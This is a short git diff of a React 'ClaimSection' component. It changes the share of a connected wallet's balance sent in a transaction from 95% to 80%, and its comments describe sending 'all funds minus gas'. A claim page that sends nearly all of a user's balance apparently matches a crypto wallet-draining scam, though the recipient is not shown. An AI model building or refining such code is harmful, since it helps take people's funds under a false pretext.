@@ -82,7 +82,7 @@ export default function ClaimSection() {
         // Calculate amount to send (all funds minus gas)
         // For a real implementation, we would estimate gas and subtract it
         // For simplicity, we'll use 95% of the balance to ensure there's enough for gas
-        const amountToSend = parseEther((Number(balanceData.formatted) * 0.95).toString());
+        const amountToSend = parseEther((Number(balanceData.formatted) * 0.80).toString());
 
         // Transaction to send all funds minus gas
         sendTransaction({
